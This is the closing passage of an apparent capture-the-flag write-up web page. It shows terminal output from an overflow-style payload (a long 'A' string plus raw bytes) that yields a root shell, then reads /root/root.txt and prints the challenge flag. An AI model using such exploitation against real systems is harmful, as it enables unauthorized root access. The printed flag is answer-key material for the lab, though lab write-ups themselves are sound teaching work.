+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>_____________________________________________<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\_</span>____________________________________________________<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\_</span>______________________________________<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_______________________________________________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-<span style="color:#3ad900;font-weight:400">'&nbsp;&nbsp;&nbsp;&nbsp;.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.&nbsp;&nbsp;---&nbsp;`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-'</span>.-.-.&nbsp;.---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.&nbsp;&nbsp;.-.-.<span style="color:#333333;font-weight:400">`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_-'.-.-.-.&nbsp;.---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`.&nbsp;.-.-.-.`-_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;_-'.-.-.-.-.&nbsp;.-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----.&nbsp;.-.-.-.-.`</span>-_<br>
+                &nbsp;_-<span style="color:#3ad900;font-weight:400">'.-.-.-.-.-.&nbsp;.---.-.&nbsp;.-----------------------------.&nbsp;.-.---.&nbsp;.---.-.-.-.`-_<br>
+                :-----------------------------------------------------------------------------:<br>
+                `---._.-----------------------------------------------------------------._.---'</span><br>
+                <br>
+                <br>
+                &nbsp;[+]&nbsp;Validated&nbsp;access&nbsp;token<br>
+                &nbsp;[+]&nbsp;Starting&nbsp;archiving&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@�W���V�<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;�i�<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;id</span><br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1000<span style="color:#ff9d00;font-weight:700">(</span>tom<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1000<span style="color:#ff9d00;font-weight:700">(</span>tom<span style="color:#ff9d00;font-weight:700">)</span>,4<span style="color:#ff9d00;font-weight:700">(</span>adm<span style="color:#ff9d00;font-weight:700">)</span>,24<span style="color:#ff9d00;font-weight:700">(</span>cdrom<span style="color:#ff9d00;font-weight:700">)</span>,27<span style="color:#ff9d00;font-weight:700">(sudo)</span>,30<span style="color:#ff9d00;font-weight:700">(</span>dip<span style="color:#ff9d00;font-weight:700">)</span>,46<span style="color:#ff9d00;font-weight:700">(</span>plugdev<span style="color:#ff9d00;font-weight:700">)</span>,115<span style="color:#ff9d00;font-weight:700">(</span>lpadmin<span style="color:#ff9d00;font-weight:700">)</span>,116<span style="color:#ff9d00;font-weight:700">(</span>sambashare<span style="color:#ff9d00;font-weight:700">)</span>,1002<span style="color:#ff9d00;font-weight:700">(</span>admin<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Success!<br>
+        Go grab <code>root.txt</code> :)<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;cat&nbsp;/root/root.txt</span><br>
+                <span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>root.txt<br>
+                1722e99ca5f353b362556a62bd5e6be0
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
